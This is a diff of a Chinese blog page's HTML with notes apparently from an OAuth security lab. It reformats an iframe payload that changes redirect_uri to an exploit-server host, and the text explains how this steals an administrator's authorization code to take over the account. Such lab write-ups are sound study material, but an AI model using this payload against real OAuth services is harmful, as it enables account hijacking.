@@ -31,7 +31,7 @@
 <meta property="og:image" content="http://zhigao.xyz/images/081-2.png">
 <meta property="og:image" content="http://zhigao.xyz/images/081-3.png">
 <meta property="article:published_time" content="2026-09-28T05:17:37.000Z">
-<meta property="article:modified_time" content="2026-09-28T05:57:20.324Z">
+<meta property="article:modified_time" content="2026-09-28T06:05:25.046Z">
 <meta property="article:author" content="智高">
 <meta property="article:tag" content="笔记">
 <meta name="twitter:card" content="summary">
@@ -217,7 +217,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2026-09-28 13:17:37 / 修改时间：13:57:20" itemprop="dateCreated datePublished" datetime="2026-09-28T13:17:37+08:00">2026-09-28</time>
+              <time title="创建时间：2026-09-28 13:17:37 / 修改时间：14:05:25" itemprop="dateCreated datePublished" datetime="2026-09-28T13:17:37+08:00">2026-09-28</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -269,10 +269,8 @@
 <!-- 这是一张图片，ocr 内容为： -->
 <p><img src="/images/081-1.png"></p>
 <h2 id="4、CSRF缺陷redirect-uri劫持code"><a href="#4、CSRF缺陷redirect-uri劫持code" class="headerlink" title="4、CSRF缺陷redirect_uri劫持code"></a><font style="color:#DF2A3F;">4、CSRF缺陷redirect_uri劫持code</font></h2><p>这个就是改redirect_url的值，改为攻击网站，攻击网站写</p>
-<p>:::info</p>
-<iframe src="[https://oauth-0a7400cb04161e5e80c1152902690027.oauth-server.net/auth?client_id=hsvii9krryl5joffjyca7&redirect_uri=https://exploit-0a2f0030045c1e37802816fc01070056.exploit-server.net/oauth-callback&response_type=code&scope=openid%20profile%20email"></iframe>](https://oauth-0a7400cb04161e5e80c1152902690027.oauth-server.net/auth?client_id=hsvii9krryl5joffjyca7&redirect_uri=https://exploit-0a2f0030045c1e37802816fc01070056.exploit-server.net/oauth-callback&response_type=code&scope=openid%20profile%20email"></iframe>)
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://oauth-0a7400cb04161e5e80c1152902690027.oauth-server.net/auth?client_id=hsvii9krryl5joffjyca7&amp;redirect_uri=https://exploit-0a2f0030045c1e37802816fc01070056.exploit-server.net/oauth-callback&amp;response_type=code&amp;scope=openid%20profile%20email&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
 
-<p>:::</p>
 <p>就是让管理员一访问网站，就向授权服务器发送授权请求，然后返回的code就会被发到回调地址，回调地址填的是我们的服务器，自然就获取到code，然后带上code直接访问就是管理员账号</p>
 <!-- 这是一张图片，ocr 内容为： -->
 <p><img src="/images/081-2.png"></p>
